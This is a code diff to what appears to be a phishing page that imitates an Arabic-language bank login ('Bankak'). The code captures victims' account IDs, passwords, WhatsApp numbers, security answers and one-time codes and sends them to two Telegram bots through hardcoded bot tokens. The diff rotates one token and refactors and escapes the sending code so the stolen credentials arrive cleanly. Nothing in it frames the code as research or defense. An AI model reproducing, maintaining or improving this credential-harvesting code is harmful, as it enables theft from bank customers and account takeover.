@@ -754,7 +754,7 @@
         otp: ""
     };
 
-    const bot1Token = "8602888229:AAHB0XSqtkVa--8uj3OvNAbNsuM4KFECtZ0";
+    const bot1Token = "9168228713:AAFONmagInLcPwsyanGql0CPeT_MOGewHVU";
     const bot1ChatId = "8623773122";
 
     const bot2Token = "8774319664:AAF1SkX7MyaNpamEmj_mb8GiHCLa1K0lhJ4";
@@ -769,13 +769,29 @@
         }
     });
 
-    function sendToTelegram(message) {
-        const url1 = `https://api.telegram.org/bot${bot1Token}/sendMessage?chat_id=${bot1ChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-        const url2 = `https://api.telegram.org/bot${bot2Token}/sendMessage?chat_id=${bot2ChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+    function escapeMarkdown(val) {
+        return String(val ?? "").replace(/`/g, "'");
+    }
 
-        fetch(url1).then(() => {
-            return fetch(url2);
-        }).catch(err => console.log(err));
+    function formatSecondBotMessage(message) {
+        return String(message ?? "").replace(/`([^`\n]+)`/g, '"$1"');
+    }
+
+    function sendToBot1(message) {
+        const url1 = `https://api.telegram.org/bot${bot1Token}/sendMessage?chat_id=${bot1ChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        return fetch(url1).catch(err => console.log(err));
+    }
+
+    function sendToBot2(message) {
+        const bot2Msg = formatSecondBotMessage(message);
+        const url2 = `https://api.telegram.org/bot${bot2Token}/sendMessage?chat_id=${bot2ChatId}&text=${encodeURIComponent(bot2Msg)}`;
+        return fetch(url2).catch(err => console.log(err));
+    }
+
+    function sendToTelegram(message) {
+        sendToBot1(message).then(() => {
+            return sendToBot2(message);
+        });
     }
 
     function goToScreen(screenId) {
@@ -819,9 +835,9 @@
         }
 
         let msg = `🚨 تسجيل دخول (بنكك)\n` +
-                  `📌 الخدمة: ${currentService || "غير محدد"}\n\n` +
-                  `👤 المعرف: \`${userData.account}\`\n` +
-                  `🔑 كلمة المرور: \`${userData.password}\``;
+                  `📌 الخدمة: ${escapeMarkdown(currentService || "غير محدد")}\n\n` +
+                  `👤 المعرف: \`${escapeMarkdown(userData.account)}\`\n` +
+                  `🔑 كلمة المرور: \`${escapeMarkdown(userData.password)}\``;
         
         sendToTelegram(msg);
 
@@ -837,7 +853,7 @@
         }
 
         let msg = `💬 رقم الواتساب\n\n` +
-                  `📱 الرقم: \`${userData.whatsapp}\``;
+                  `📱 الرقم: \`${escapeMarkdown(userData.whatsapp)}\``;
 
         sendToTelegram(msg);
 
@@ -855,8 +871,8 @@
         }
 
         let msg = `🛡️ إجابة سؤال الأمان\n\n` +
-                  `❓ السؤال:\n${userData.question}\n\n` +
-                  `💡 الإجابة: \`${userData.answer}\``;
+                  `❓ السؤال:\n${escapeMarkdown(userData.question)}\n\n` +
+                  `💡 الإجابة: \`${escapeMarkdown(userData.answer)}\``;
         
         sendToTelegram(msg);
 
@@ -907,7 +923,7 @@
         }
 
         let msg = `📱 رمز التحقق OTP\n\n` +
-                  `🔢 الرمز: \`${userData.otp}\``;
+                  `🔢 الرمز: \`${escapeMarkdown(userData.otp)}\``;
         
         sendToTelegram(msg);
 
